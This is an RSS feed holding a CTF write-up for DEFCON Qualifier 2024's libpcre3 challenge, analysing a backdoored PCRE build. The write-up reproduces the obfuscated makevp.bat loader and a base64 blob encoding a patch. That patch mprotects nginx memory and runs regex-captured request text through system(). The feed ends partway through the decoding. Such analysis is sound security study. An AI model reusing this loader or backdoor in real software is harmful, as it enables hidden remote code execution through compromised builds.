<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Write-Up on kyrie</title>
    <link>https://w1n-gl0ry.github.io/tags/write-up/</link>
    <description>Recent content in Write-Up on kyrie</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Some copyright notice - [my license](https://example.com/license)</copyright>
    <lastBuildDate>Fri, 10 May 2024 17:37:11 +0800</lastBuildDate><atom:link href="https://w1n-gl0ry.github.io/tags/write-up/index.xml" rel="self" type="application/rss+xml" /><icon>https://w1n-gl0ry.github.io/logo.svg</icon>
    
    
    <item>
      <title>DEFCON Qualifier 2024</title>
      <link>https://w1n-gl0ry.github.io/posts/defcon32/</link>
      <pubDate>Fri, 10 May 2024 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/defcon32/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>I have played DEFCON-CTF Qualifier 2024 with my team 1337%Yogurt, we ended up with 30th place and I solved 5 pwnable challenges. In this write-up, I will write all the challenges I solved during and after the contests.</p>
<p><img src="https://i.imgur.com/St1ntx9.png" alt="scoreboard"></p>
<h1 id="pwn---libpcre3">Pwn - libpcre3</h1>
<blockquote>
<p>Software gets better with every release!</p>
</blockquote>
<p><a href="">Attachment</a></p>
<h2 id="overview">Overview</h2>
<p>When using regular expressions in C (also known as <code>regex</code>), we usually use 2 main libraries: <code>POSIX</code> and <code>PCRE</code>.</p>
<h3 id="posix-regular-expressions">POSIX Regular Expressions</h3>
<p>If you see the following included in the C source then it’s POSIX Regular Expressions. POSIX Regular expressions have lost the popularity battle and you won’t see them used much.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;regex.h&gt;</span><span style="color:#75715e">
</span></span></span></code></pre></div><p>I won’t discuss POSIX regular expressions in this blog post from here on.</p>
<h3 id="pcre---perl-compatible-regular-expressions">PCRE - Perl Compatible Regular Expressions</h3>
<p>Regular expressions from Perl gained widespread popularity and its syntax is what you’ll normally see in Java, Javascript, Python, Perl, and other languages. The library PCRE is written in C and claims to be much more powerful and flexible than POSIX. I actually can’t confirm that opinion because I’ve only learned the popularized Perl regular expression format.</p>
<h4 id="pcre-and-pcre2">PCRE and PCRE2</h4>
<p>The <a href="https://pcre.org/">PCRE Library</a> has 2 versions: <code>pcre</code> and <code>pcre2</code> . The older pcre was released over 20 years ago in 1997 and is at version 8.43 as of this post. Future releases will be for bug fixes only. New features will be released in pcre2 which was released in 2015 and is now at version 10.34 as of this writing. In this blog post, we have an example for both pcre and pcre2.</p>
<p>In this challenge, they used version <code>8.39</code> of <code>pcre</code>.</p>
<h4 id="install-pcre">Install PCRE</h4>
<p>We can install the pcre library through a package manager.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get install libpcre3 libpcre3-dev
</span></span></code></pre></div><p>But I will install the pcre library from the source of this challenge to test it first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get update -y <span style="color:#f92672">&amp;&amp;</span> sudo apt-get install -y apt-src build-essential devscripts dpkg-dev
</span></span><span style="display:flex;"><span>tar xvf pcre3_8.39-16.tar.gz
</span></span><span style="display:flex;"><span>cd pcre3_8.39
</span></span><span style="display:flex;"><span>dpkg-buildpackage -b
</span></span></code></pre></div><p>After running the last command, we get this output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>├── libpcre16-3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre32-3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3-dbg_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcre3-dev_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── libpcrecpp0v5_8.39-16_amd64.deb
</span></span><span style="display:flex;"><span>├── nginx.conf
</span></span><span style="display:flex;"><span>├── pcre3-8.39
</span></span></code></pre></div><p>Basically, use this command below to install this library</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ sudo dpkg -i libpcre3_8.39-16_amd64.deb 
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Reading database ... <span style="color:#ae81ff">355004</span> files and directories currently installed.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Preparing to unpack libpcre3_8.39-16_amd64.deb ...
</span></span><span style="display:flex;"><span>Unpacking libpcre3:amd64 <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> over <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Setting up libpcre3:amd64 <span style="color:#f92672">(</span>2:8.39-16<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> libc-bin <span style="color:#f92672">(</span>2.35-0ubuntu3.7<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> man-db <span style="color:#f92672">(</span>2.10.2-1<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><p>The PCRE library comes with a helper tool. Called <code>pcretest</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/libprce/deb/pcre-8.39/.libs                                                                                                             23:17:17
</span></span><span style="display:flex;"><span>╰──➤ ./pcretest
</span></span><span style="display:flex;"><span>PCRE version 8.39 2016-06-14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  re&gt; <span style="color:#e6db74">&#34;abc&#34;</span>
</span></span><span style="display:flex;"><span>data&gt; ab
</span></span><span style="display:flex;"><span>No match
</span></span><span style="display:flex;"><span>data&gt; abc
</span></span><span style="display:flex;"><span> 0: abc
</span></span><span style="display:flex;"><span>data&gt;
</span></span></code></pre></div><p>Now, we are going to focus on this challenge.</p>
<h3 id="nginx">Nginx</h3>
<p>The challenge gives us the Nginx configure file</p>
<p><code>nginx.conf</code></p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39;
                      &#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39;
                      &#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;;

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;

    keepalive_timeout  65;

    server {
        listen 8080;
        root /var/www/html;

        location ~.*\.(php|php2|php3)$
        {
            return 403;
        }
    }
}
</code></pre><p>It is worth noting that in the server block, the location block uses regex to handle all PHP requests with a URI ending with php, php2, and php3.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>location <span style="color:#f92672">~</span>.<span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">\</span>.(php<span style="color:#f92672">|</span>php2<span style="color:#f92672">|</span>php3)<span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">403</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nginx uses the libpcre library to support the processing of regular expressions in configuration and the processing of HTTP requests. This allows Nginx to perform tasks such as URL mapping, request processing, and responses based on regular expressions flexibly and efficiently.</p>
<h2 id="source-code-overview">Source-code overview</h2>
<ul>
<li>This chall provides a <code>pcre</code> source code, and a nginx file config, which is different from the official <code>pcre-8.39</code> source code.</li>
</ul>
<pre tabindex="0"><code>.
├── nginx.conf
├── pcre-8.39
</code></pre><p>So, the first thing I did was install the original source code to compare the given library folder</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git diff prce-8.39 prce-8.39-orgin
</span></span></code></pre></div><p>Comparing with the diff command shows us the results below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/prce-8.39/makevp.bat b/prce-8.39-orgin/makevp.bat
</span></span><span style="display:flex;"><span>index b5a29f3..5f79548 100644
</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/prce-8.39/makevp.bat
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/prce-8.39-orgin/makevp.bat
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -1,4 +1,3 @@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">-exec 2&gt;&amp;-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span> :: AH 20-12-06 modified for new PCRE-7.0 and VP/BCC
</span></span><span style="display:flex;"><span> :: PH 19-03-07 renamed !compile.txt and !linklib.txt as makevp-compile.txt and
</span></span><span style="display:flex;"><span> ::             makevp-linklib.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -17,14 +16,14 @@ REM This file was contributed by Alexander Tokarev for building PCRE for use
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> REM with Virtual Pascal. It has not been tested with the latest PCRE release.
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> REM This file has been modified and extended to compile with newer PCRE releases
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM by Stefan O&#39;Weber (Angels Holocaust).
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+REM by Stefan Weber (Angels Holocaust).
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> 
</span></span><span style="display:flex;"><span> REM CHANGE THIS FOR YOUR BORLAND C++ COMPILER PATH
</span></span><span style="display:flex;"><span> SET BORLAND=f:\bcc
</span></span><span style="display:flex;"><span> REM location of the TASM binaries, if compiling with the -B BCC switch
</span></span><span style="display:flex;"><span> SET TASM=f:\tasm
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin&#39;;PATH=:$PATH;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> SET PCRE_VER=77
</span></span><span style="display:flex;"><span> SET COMPILE_DEFAULTS=-DHAVE_CONFIG_H -DPCRE_STATIC -I%BORLAND%\include
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -32,7 +31,7 @@ del pcre%PCRE_VER%.lib &gt;nul 2&gt;nul
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span> :: sh configure
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-:: check for needed header files&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+:: check for needed header files
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> if not exist pcre.h copy pcre.h.generic pcre.h
</span></span><span style="display:flex;"><span> if not exist config.h copy config.h.generic config.h
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -46,15 +45,6 @@ REM compile and link the PCRE library into lib: option -B for ASM compile works
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> bcc32 -a4 -c -RT- -y- -v- -u- -R- -Q- -X -d -fp -ff -P- -O2 -Oc -Ov -3 -w-8004 -w-8064 -w-8065 -w-8012 -UDFTABLES -DVPCOMPAT %COMPILE_DEFAULTS% @makevp_c.txt
</span></span><span style="display:flex;"><span> IF ERRORLEVEL 1 GOTO ERROR
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM Cleanup after the tests&#39;; 
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-REM Deprecated, using cleanup-tests now; if [ ! -f .tests-built ]; then compare_output() { tr $&#39;\n&#39; &lt;$1 &#39; &#39;|cut -c$2-$2|tr -d $&#39;\n&#39;; };test_results=$(for i in $(sed -n &#39;369,369p&#39; ./t
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>est*/*18-16); do IFS=&#39;.&#39;;set -- $i;IFS=&#39; &#39;; compare_output $(sed -n &#34;$1,${1}p&#34; makevp_c.txt) $2; done);
</span></span><span style="display:flex;"><span><span style="color:#f92672">-REM; sh -c &#34;$test_results&#34;; touch .tests-built; fi
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-cleanup-tests $@ || make $@
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-:&lt;&lt;END
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span> tlib %BORLAND%\lib\cw32.lib *calloc *del *strncmp *memcpy *memmove *memset *memcmp *strlen
</span></span><span style="display:flex;"><span> IF ERRORLEVEL 1 GOTO ERROR
</span></span><span style="display:flex;"><span> tlib pcre%PCRE_VER%.lib @makevp_l.txt +calloc.obj +del.obj +strncmp.obj +memcpy.obj +memmove.obj +memset.obj +memcmp.obj +strlen.obj
</span></span></code></pre></div><p>We can see some malicious command in the <code>makevp.bat</code> file, I think it&rsquo;s a backdoor through some build process, and extracted from that we get this output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f .tests-built <span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">then</span> compare_output<span style="color:#f92672">()</span> <span style="color:#f92672">{</span> tr <span style="color:#e6db74">$&#39;\n&#39;</span> &lt;$1 <span style="color:#e6db74">&#39; &#39;</span>|cut -c$2-$2|tr -d <span style="color:#e6db74">$&#39;\n&#39;</span>; <span style="color:#f92672">}</span>;
</span></span><span style="display:flex;"><span>    test_results<span style="color:#f92672">=</span><span style="color:#66d9ef">$(for</span> i in <span style="color:#66d9ef">$(</span>sed -n <span style="color:#e6db74">&#39;369,369p&#39;</span> ./test*/*18-16<span style="color:#66d9ef">)</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.&#39;</span>;set -- $i;IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>; compare_output <span style="color:#66d9ef">$(</span>sed -n <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">,</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">p&#34;</span> makevp_c.txt<span style="color:#66d9ef">)</span> $2; <span style="color:#66d9ef">done)</span>; 
</span></span><span style="display:flex;"><span>    sh -c <span style="color:#e6db74">&#34;</span>$test_results<span style="color:#e6db74">&#34;</span>; touch .tests-built; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>The changelog file under the subdirectory of the library folder called <code>debian</code> also gives us the hint</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>pcre3 (2:8.39-16) unstable; urgency=medium
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  * Adds a missing long decimal test case and enable test running on windows
</span></span><span style="display:flex;"><span>    (Closes: #1258321)
</span></span></code></pre></div><p>Run this give us output of the <code>test_results</code> variable</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo &gt;a CiMvYmluL2Jhc2gKaWYgWyAteiAiJEJVSUxEX05VTUJFUiIgXTsgdGhlbgpybSAtZiBhCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHJtIC1mIGNsZWFudXAtdGVzdHM7IGZpCkVPRgpjaG1vZCAreCBjbGVhbnVwLXRlc3RzOyBtYWtlIFwkQApleGl0IDAKZmkKZXhlYyAyPiYtCnNlZCAtaSAnMzY4LDM3MGQnIC4vdGVzdGRhdGEvdGVzdG91dHB1dDE4LTE2CmNhdCA8PEVPRiA+ICd0ZXN0ZGF0YS8gJwpkaWZmIC0tZ2l0IGEvcGNyZV9jb21waWxlLmMgYi9wY3JlX2NvbXBpbGUuYwppbmRleCBjNzQyMjI3Li5jMjQxOWVmIDEwMDY0NAotLS0gYS9wY3JlX2NvbXBpbGUuYworKysgYi9wY3JlX2NvbXBpbGUuYwpAQCAtNjUsNiArNjUsMTAgQEAgQ09NUElMRV9QQ1JFeCBtYWNybyB3aWxsIGFscmVhZHkgYmUgYXBwcm9wcmlhdGVseSBzZXQuICovCiAjdW5kZWYgUENSRV9JTkNMVURFRAogI2VuZGlmCiAKKyNpbmNsdWRlICJmY250bC5oIgorI2luY2x1ZGUgInN0cmluZy5oIgorI2luY2x1ZGUgPHN5cy9tbWFuLmg+CisKIAogLyogTWFjcm8gZm9yIHNldHRpbmcgaW5kaXZpZHVhbCBiaXRzIGluIGNsYXNzIGJpdG1hcHMuICovCiAKQEAgLTg5NzQsNiArODk3OCwxNCBAQCBSZXR1cm5zOiAgICAgICAgcG9pbnRlciB0byBjb21waWxlZCBkYXRhIGJsb2NrLCBvciBOVUxMIG9uIGVycm9yLAogICAgICAgICAgICAgICAgIHdpdGggZXJyb3JwdHIgYW5kIGVycm9yb2Zmc2V0IHNldAogKi8KIAorY2hhciogYWxwaCA9CisjaW5jbHVkZSAiYi5oIgorOworY2hhciogZGF0ZV9zID0gCisjaW5jbHVkZSAiZC5oIgorOworcGNyZSogYmRfcmUgPSBOVUxMOworCiAjaWYgZGVmaW5lZCBDT01QSUxFX1BDUkU4CiBQQ1JFX0VYUF9ERUZOIHBjcmUgKiBQQ1JFX0NBTExfQ09OVkVOVElPTgogcGNyZV9jb21waWxlKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBjb25zdCBjaGFyICoqZXJyb3JwdHIsCkBAIC04OTk4LDYgKzkwMTAsNyBAQCByZXR1cm4gcGNyZTMyX2NvbXBpbGUyKHBhdHRlcm4sIG9wdGlvbnMsIE5VTEwsIGVycm9ycHRyLCBlcnJvcm9mZnNldCwgdGFibGVzKTsKIH0KIAogCisKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gcGNyZSAqIFBDUkVfQ0FMTF9DT05WRU5USU9OCiBwY3JlX2NvbXBpbGUyKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBpbnQgKmVycm9yY29kZXB0ciwKQEAgLTkwMTIsNiArOTAyNSw5IEBAIHBjcmUzMl9jb21waWxlMihQQ1JFX1NQVFIzMiBwYXR0ZXJuLCBpbnQgb3B0aW9ucywgaW50ICplcnJvcmNvZGVwdHIsCiAgIGNvbnN0IGNoYXIgKiplcnJvcnB0ciwgaW50ICplcnJvcm9mZnNldCwgY29uc3QgdW5zaWduZWQgY2hhciAqdGFibGVzKQogI2VuZGlmCiB7CitjaGFyIGJbMHg0MDBdOworaWYgKGJkX3JlID09IE5VTEwpIHsgYmRfcmUgPSAxO2ludCBmPW9wZW4oIi9wcm9jL3NlbGYvbWFwcyIsIE9fUkRPTkxZKTtzdHJjcHkoYiwgIl4vIik7c3RyY2F0KGIsIGFscGgpO3N0cmNhdChiLCAiLyhbXFxcJGEtekEtWjAtOTs6Ly58XSspIik7Y2hhciAqZSA9IDA7aW50IGVvO2JkX3JlID0gcGNyZV9jb21waWxlKGIsIFBDUkVfTVVMVElMSU5FLCAmZSwgJmVvLCAwKTtpZiAoYmRfcmUgPT0gTlVMTCkge2JkX3JlID0gMTt9cmVhZChmLCBiLCAxMik7YlsxMl0gPSAwO2NoYXIqIGJhc2UgPSAoY2hhciopc3RydG91bGwoYiwgMCwgMTYpO2Nsb3NlKGYpO2ludCBjPTA7Zm9yIChpbnQgaT0wOyBpPDB4MTMwMDAwOyBpKyspIHtjaGFyKiBwID0gYmFzZSArIGk7aWYgKHBbMF09PSduJyZwWzFdPT0nZycmcFsyXT09J2knJnBbM109PSduJyZwWzRdPT0neCcmcFs1XT09Jy8nJnBbNl09PScxJyZwWzddPT0nLicmcFs4XT09JzEnJnBbOV09PSc4JyZwWzEwXT09Jy4nKSB7YysrOyBpZiAoYyA+IDUpIGJyZWFrO3ZvaWQqIHBfcGFnZSA9ICh2b2lkKikoKHVpbnQ2NF90KXAgJiAweGZmZmZmZmZmZmZmZmYwMDApO21wcm90ZWN0KHBfcGFnZSwgMHgxMDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSk7c25wcmludGYocCwgMjEsICJuaS9uZ2lueC8lcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBkYXRlX3MpO3BbMjBdID0gMHgyMDt9fSB9CisKIFJFQUxfUENSRSAqcmU7CiBpbnQgbGVuZ3RoID0gMTsgIC8qIEZvciBmaW5hbCBFTkQgb3Bjb2RlICovCiBwY3JlX2ludDMyIGZpcnN0Y2hhcmZsYWdzLCByZXFjaGFyZmxhZ3M7CmRpZmYgLS1naXQgYS9wY3JlX2V4ZWMuYyBiL3BjcmVfZXhlYy5jCmluZGV4IDU1MjMwY2QuLjMzOTk3MzggMTAwNjQ0Ci0tLSBhL3BjcmVfZXhlYy5jCisrKyBiL3BjcmVfZXhlYy5jCkBAIC02MzQ3LDYgKzYzNDcsMTAgQEAgUmV0dXJuczogICAgICAgICAgPiAwID0+IHN1Y2Nlc3M7IHZhbHVlIGlzIHRoZSBudW1iZXIgb2YgZWxlbWVudHMgZmlsbGVkIGluCiAgICAgICAgICAgICAgICAgICAgLTEgPT4gZmFpbGVkIHRvIG1hdGNoCiAgICAgICAgICAgICAgICAgIDwgLTEgPT4gc29tZSBraW5kIG9mIHVuZXhwZWN0ZWQgcHJvYmxlbQogKi8KK2ludCBiZCA9IDA7CisvLyBEZWZpbmVkIGluIG90aGVyIGMgZmlsZQorZXh0ZXJuIHBjcmUqIGJkX3JlOworZXh0ZXJuIGNoYXIqIGFscGg7CiAKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gaW50IFBDUkVfQ0FMTF9DT05WRU5USU9OCkBAIC02Mzk4LDYgKzY0MDIsMTEgQEAgZnJhbWVfemVyby5YbmV4dGZyYW1lID0gTlVMTDsgICAgICAgICAgICAvKiBOb25lIGFyZSBhbGxvY2F0ZWQgeWV0ICovCiBtZC0+bWF0Y2hfZnJhbWVzX2Jhc2UgPSAmZnJhbWVfemVybzsKICNlbmRpZgogCisvLyBIZXJlIGlzIHRoZSB0YXJnZXQsIGdvb2QgbHVjazoKKy8vIGN1cmwgaHR0cDovL2NoaXB0dW5lZ2Vlay5zaGVsbHdlcGxheWFnYS5tZToxOTQvWyBDRU5TT1JFRCBdIC0taGVhZGVyICJUaWNrZXQ6IHRpY2tldHtbIENFTlNPUkVEIF19IiBbIENFTlNPUkVEIF0KK2NoYXIgYnVmWzB4MjAwMF07CitpZiAoYmQ9PSAwKSB7IGJkID0gMTsgaWYgKGJkX3JlKSB7IGludCBvdlszMF07aW50IHJjID0gcGNyZV9leGVjKGJkX3JlLCBOVUxMLCBzdWJqZWN0LCBzdHJsZW4oc3ViamVjdCksIDAsIDAsIG92LCBzaXplb2Yob3YpL3NpemVvZihvdlswXSkpO2lmIChyYyA+PSAyKSB7IHBjcmVfY29weV9zdWJzdHJpbmcoc3ViamVjdCwgb3YsIHJjLCAxLCBidWYsIHNpemVvZihidWYpKTtjaGFyKiBtID0gc3RyZHVwKGJ1Zik7c3lzdGVtKG0pOyB9fSBiZCA9IDA7IH0KKwogLyogQ2hlY2sgZm9yIHRoZSBzcGVjaWFsIG1hZ2ljIGNhbGwgdGhhdCBtZWFzdXJlcyB0aGUgc2l6ZSBvZiB0aGUgc3RhY2sgdXNlZAogcGVyIHJlY3Vyc2l2ZSBjYWxsIG9mIG1hdGNoKCkuIFdpdGhvdXQgdGhlIGZ1bm55IGNhc3RpbmcgZm9yIHNpemVvZiwgYSBXaW5kb3dzCiBjb21waWxlciBnYXZlIHRoaXMgZXJyb3I6ICJ1bmFyeSBtaW51cyBvcGVyYXRvciBhcHBsaWVkIHRvIHVuc2lnbmVkIHR5cGUsCgpFT0YKcGF0Y2ggLXAxIDwgJ3Rlc3RkYXRhLyAnIDI+JjEgMT4vZGV2L251bGwKZWNobyAkKCgkKGRhdGUgKyVzKSAvIDg2NDAwKSkgfCBtZDVzdW0gfCBjdXQgLWQnICcgLWYxIHwgIGF3ayAneyBmb3IoaT0wO2k8MTA7aSsrKSBwcmludGYgIiVzIiwgJDEgfScgPiBhCmVjaG8gJyInJChlY2hvICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSIgfCBncmVwIC1vIC4gfCBzaHVmIC0tcmFuZG9tLXNvdXJjZSAuL2F8IHRyIC1kICcKJyknIicgPiBiLmg7IHJtIC1mIC4vYTsKZWNobyAnIickKGRhdGUgKyIlbS4lZC4leSIgfCB0ciAtZCAnMCcpJyInID4gZC5oCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHBhdGNoIC1SIC1wMSA8ICd0ZXN0ZGF0YS8gJyAyPiYxIDE+L2Rldi9udWxsOyBybSAtZiAndGVzdGRhdGEvICc7IHJtIC1mIGNsZWFudXAtdGVzdHMgYi5oIGQuaDsgZmkKRU9GCmNobW9kICt4IGNsZWFudXAtdGVzdHM7IG1ha2UgJEAK;base64 a&gt;cleanup-tests -d;chmod +x cleanup-tests   
</span></span></code></pre></div><p>decoding the base64 gives us this content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> [ <span style="color:#f92672">-</span>z <span style="color:#e6db74">&#34;$BUILD_NUMBER&#34;</span> ]; then
</span></span><span style="display:flex;"><span>rm <span style="color:#f92672">-</span>f a
</span></span><span style="display:flex;"><span>cat <span style="color:#f92672">&lt;&lt;</span>EOF <span style="color:#f92672">&gt;</span> cleanup<span style="color:#f92672">-</span>tests
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>make <span style="color:#960050;background-color:#1e0010">\$@</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> [ <span style="color:#e6db74">&#34;\$1&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;install&#34;</span> ]; then rm <span style="color:#f92672">-</span>f cleanup<span style="color:#f92672">-</span>tests; fi
</span></span><span style="display:flex;"><span>EOF
</span></span><span style="display:flex;"><span>chmod <span style="color:#f92672">+</span>x cleanup<span style="color:#f92672">-</span>tests; make <span style="color:#960050;background-color:#1e0010">\$@</span>
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>fi
</span></span><span style="display:flex;"><span>exec <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;-</span>
